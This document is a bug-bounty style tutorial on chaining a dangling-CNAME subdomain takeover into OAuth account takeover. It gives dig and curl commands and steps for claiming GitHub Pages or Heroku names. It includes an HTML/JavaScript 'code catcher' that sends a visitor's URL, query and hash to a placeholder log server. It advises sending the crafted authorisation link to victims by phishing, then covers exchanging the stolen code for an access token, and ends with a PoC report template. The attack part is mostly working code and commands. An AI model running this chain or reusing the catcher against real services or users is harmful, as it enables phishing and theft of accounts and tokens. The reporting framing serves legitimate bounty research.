Subdomain Takeover to OAuth Account Takeover
Why This Chain Works
A dangling CNAME pointing at an unclaimed GitHub Pages bucket, Heroku app, or Fastly service gets reported as medium. What makes it critical is when that subdomain is registered as a valid redirect_uri in the target's OAuth application. The identity provider trusts the subdomain because it belongs to the target's domain namespace. You've claimed it, which means you control the endpoint that receives authorisation codes. Every user who starts an OAuth login becomes a target.

Step-by-Step
1. Find the Dangling CNAME
During recon, check DNS records for all subdomains you can enumerate:
# Using dig to check for CNAME pointing at unclaimed service
dig CNAME sub.target.com
 
# If response is: sub.target.com CNAME somename.github.io
# and somename.github.io returns a 404 or "There isn't a GitHub Pages site here"
# - that's a candidate
 
# Common services with takeover potential:
# GitHub Pages     - <name>.github.io 404 with "There isn't a..."
# Heroku           - <name>.herokuapp.com "No such app"
# Netlify          - <name>.netlify.app not found
# AWS S3           - <name>.s3.amazonaws.com "NoSuchBucket"
# Fastly           - "Fastly error: unknown domain"
# Zendesk          - <name>.zendesk.com "Help Center Closed"
Use tools like subjack, subzy, or nuclei -t takeovers/ to automate detection across a large subdomain set.
2. Claim the Service
Once you confirm the target is unclaimed, register it:
GitHub Pages:
# Create a repo named: somename (matching the CNAME target)
# Enable GitHub Pages on it
# Serve a simple index.html that logs incoming query parameters
Heroku:
heroku create somename
# Then add a custom domain pointing to target subdomain
Netlify:
# Create a site, configure custom domain to sub.target.com
Confirm takeover by visiting sub.target.com and seeing your content.
3. Check OAuth Registrations
Look at the OAuth login flow on the main application. Check the redirect_uri in authorisation requests:
GET /oauth/authorize?
  client_id=CLIENT_ID
  &redirect_uri=app.target.com/callback
  &response_type=code
  &scope=openid
If the registered callback is on app.target.com and you've taken over static.target.com, check if the auth server uses prefix-match validation that would accept static.target.com/.... Also check if the OAuth client has multiple registered redirect URIs - the full list may not be visible in the auth request but might include the takeover candidate.
Attempt the crafted request directly:
curl -v "idp.target.com/authorize://sub.target.com/catch&response_type=code&scope=openid"
If the server does not return a redirect_uri_mismatch error, the subdomain is accepted.
4. Build the Code Catcher
Deploy a simple page at the takeover subdomain that logs incoming requests:
<!DOCTYPE html>
<html>
<head><title>Catch</title></head>
<body>
<script>
  // Log everything: query params and hash fragment
  var data = {
    search: window.location.search,
    hash: window.location.hash,
    href: window.location.href
  };
  new Image().src = 'https://YOUR_LOG_SERVER/?d=' + encodeURIComponent(JSON.stringify(data));
</script>
</body>
</html>
Host this at /catch on the takeover subdomain.
5. Send the Malicious Link
Build the full authorisation URL with the takeover subdomain as redirect_uri and send it to a victim (phishing, embedded in a post, shared in a public forum):
idp.target.com/authorize
  client_id=CLIENT_ID
  &redirect_uri=sub.target.com/catch
  &response_type=code
  &scope=openid+email+profile
When the victim authenticates, the code lands at your takeover endpoint.
6. Exchange the Code
curl -X POST idp.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=sub.target.com/catch" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"

PoC Template for Report
1. DNS: sub.target.com CNAME somename.github.io (verified with dig)
2. somename.github.io returns 404 "There isn't a GitHub Pages site here"
3. Claimed repo: github.com/attacker/somename - GitHub Pages enabled
4. Confirm: sub.target.com now serves attacker content
5. OAuth test: GET /authorize?client_id=ID&redirect_uri=sub.target.com/catch
   - Server responds 302 to sub.target.com (no mismatch error) - redirect_uri accepted
6. Code catcher deployed at sub.target.com/catch
7. Victim (test account) clicks crafted link, authenticates
8. Log server receives: code=AUTH_CODE
9. Token exchange succeeds: {"access_token":"VICTIM_TOKEN"}
10. GET /api/me with victim token confirms identity.

Reporting Notes
The report has two distinct parts: the subdomain takeover itself, and the OAuth impact. Show both. Include the DNS evidence (dig output), the claim confirmation (screenshot of your content at the subdomain), the OAuth registration evidence (the auth server accepting your redirect_uri without error), and the code exchange. Programs often assign separate bounties for the takeover and the OAuth escalation if you document them clearly as a chain. Severity sits at critical when the OAuth app grants access to the primary application.
